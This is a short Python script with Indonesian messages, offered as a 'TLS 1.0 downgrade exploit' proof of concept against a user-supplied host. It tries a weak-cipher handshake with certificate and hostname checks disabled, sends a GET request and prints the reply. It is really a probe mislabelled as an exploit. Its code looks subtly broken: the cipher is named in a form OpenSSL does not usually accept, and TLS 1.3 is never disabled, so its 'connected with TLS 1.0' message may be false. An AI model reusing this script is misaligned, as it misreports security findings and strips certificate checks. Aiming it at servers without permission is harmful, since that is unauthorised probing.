import socket
import ssl
import time
import sys
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

def exploit_tls_downgrade(hostname, port=443):
    print(f"\nMencoba eksploitasi downgrade TLS pada {hostname}:{port}")

    weak_cipher = "TLS_RSA_WITH_AES_128_CBC_SHA"

    try:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS)
        context.set_ciphers(weak_cipher)
        context.options |= ssl.OP_NO_TLSv1_1
        context.options |= ssl.OP_NO_TLSv1_2
        context.check_hostname = False 
        context.verify_mode = ssl.CERT_NONE  

        with socket.create_connection((hostname, port)) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                print("\033[92mBerhasil terhubung dengan TLS 1.0 menggunakan cipher suite yang lemah.\033[0m")
                print(f"Cipher suite yang digunakan: {ssock.cipher()}")

                request = b"GET / HTTP/1.1\r\nHost: " + hostname.encode() + b"\r\n\r\n"
                ssock.sendall(request)

                response = ssock.recv(1024)
                if response:
                    print("\033[93mRespons server (sebagian):\033[0m")
                    print(response.decode()[:200])  # Tampilkan sebagian respons untuk PoC
                else:
                    print("\033[93mTidak ada respons dari server.\033[0m")

    except ssl.SSLError:
        print("\033[91mGagal terhubung dengan TLS 1.0 menggunakan cipher suite yang lemah.\033[0m")
    except Exception as e:
        print(f"Terjadi kesalahan: {e}")

def main():
    if len(sys.argv) != 2:
        print("Penggunaan: python3 tls_1_0_exploit.py <hostname>")
        return

    hostname = sys.argv[1]
    exploit_tls_downgrade(hostname)

if __name__ == "__main__":
    main()
